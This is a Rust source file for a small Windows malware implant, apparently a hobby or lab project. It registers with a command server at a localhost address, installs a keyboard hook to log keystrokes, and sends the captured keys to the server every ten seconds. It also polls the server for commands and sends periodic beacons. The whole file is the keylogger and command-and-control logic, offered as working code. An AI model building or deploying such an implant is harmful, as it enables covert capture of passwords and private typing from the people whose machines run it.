mod server;
mod system;
mod encode;
use std::{sync::Arc};
use system::{get_windows_version, read_file, set_windows_hook};
use tokio::time::{Duration, sleep};


macro_rules! unwrap_or_panic {
    ($expr: expr) => {
        match $expr{
            Ok(res) =>{
                res
            },
                Err(e) => {panic!("Couldn't connect to server {}", e)
            }
        }   
    };
}

#[tokio::main]
async fn main() {
    const URL: &'static str  = "http://127.0.0.1:5000";
    
    
    let server = Arc::new(server::Connection::new(&URL));

    let arch = get_windows_version();

    let mut counter = 0;

    let id: String = unwrap_or_panic!(server.register(arch).await);

    let server_for_beconing = Arc::clone(&server);
    let id_beconing = id.clone();

    let server_for_exfil = Arc::clone(&server);
    let id_exfil = id.clone();

    let server_for_command =  Arc::clone(&server);
    let id_command = id.clone();

    //Create Thread for listenining on user key strokes
    tokio::spawn(async move {

        unsafe {
            set_windows_hook();
        }
    });

    //Create Thread for executing commands
    tokio::spawn(async move {

        loop {
     
            let rec = unwrap_or_panic!(server_for_command.get_command(&id_command).await);
            execute_command(&rec).await; 
            sleep(Duration::from_secs(10)).await;

        }
    });

    //Create thread for exfiltrating key strokes
    tokio::spawn(async move {

        loop {
                let keys = read_file();
                let result = server_for_exfil.send_data(&id_exfil, &keys.clone()).await;
                sleep(Duration::from_secs(10)).await;
            }
    });

    //main loop for beconing
    loop{

        match server_for_beconing.becon(&id_beconing).await{

            Ok(_) => {counter = 0;},
            Err(_) => {counter += 1;}
        };

        if counter >= 2 {

            std::process::exit(1)
        }
        sleep(Duration::from_secs(30)).await; 

    }
    
    
}


async fn execute_command(cmd: & str){
   
    println!("Executing");
    let cmds: Vec<_> = cmd.split([':']).collect();
    println!("{}",cmds[0] == "slp");

    match cmds[0]{
        "slp" => {
            print!("sleeping");
            sleep(Duration::from_secs(cmds[1].parse().unwrap())).await;

        },
        "shd" => {

            std::process::exit(1);
        },
        "pwn" => {

            println!("{}",cmds[1]);
        },
        _ => {}
    };

}
